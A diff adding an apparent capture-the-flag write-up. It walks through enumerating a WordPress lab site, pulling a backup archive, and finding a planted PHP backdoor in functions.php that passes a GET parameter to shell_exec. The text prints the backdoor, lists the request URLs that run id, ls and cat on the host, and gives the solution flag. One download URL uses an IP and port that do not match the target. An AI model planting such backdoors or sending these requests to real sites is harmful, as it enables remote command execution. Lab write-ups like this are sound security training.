@@ -1,0 +1,25 @@
+1. Opened the website at http://34.40.67.79:31439/ and saw a WordPress site. 
+
+2. Installed dirsearch by running git clone https://github.com/maurosoria/dirsearch.git, then cd dirsearch, then pip3 install -r requirements.txt to install dependencies.
+
+3. Ran dirsearch with python3 dirsearch.py -u http://34.40.67.79:31439/ and found a backup.zip archive at /backup.zip of size 19MB.
+
+4. Downloaded backup.zip using wget http://34.107.45.207:30148/backup.zip and unzipped it into a folder with unzip backup.zip -d backup_folder.
+
+5. Changed into the backup_folder and searched for dangerous PHP functions using grep -r "shell_exec("
+This pinpointed location in backup.zip that was wp-content/themes/twentytwentytwo/functions.php.
+We can open it with nano viewer. just write nano [name of file] so nano functions.php
+Inside it we found following code:
+function sentimental_function() { 
+  If ($_GET['welldone'] == 'knockknock') { 
+        echo shell_exec($_GET['shazam']); 
+  }
+}
+
+6. Discovered that the parameter welldone=knockknock was needed by testing http://34.40.67.79:31439/?welldone=knockknock&shazam=id which successfully executed the id command
+
+7. Used the working backdoor to list the root directory with ?welldone=knockknock&shazam=ls%20/ and saw a file named flag.php
+http://34.40.67.79:31439/?welldone=knockknock&shazam=ls%20/
+
+8. Read flag.php using ?welldone=knockknock&shazam=cat%20flag.php and viewed the source, which contained an if(1===2) statement that echoed the flag: CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}
+(Find Ctrl + F and search for CTF in page source)
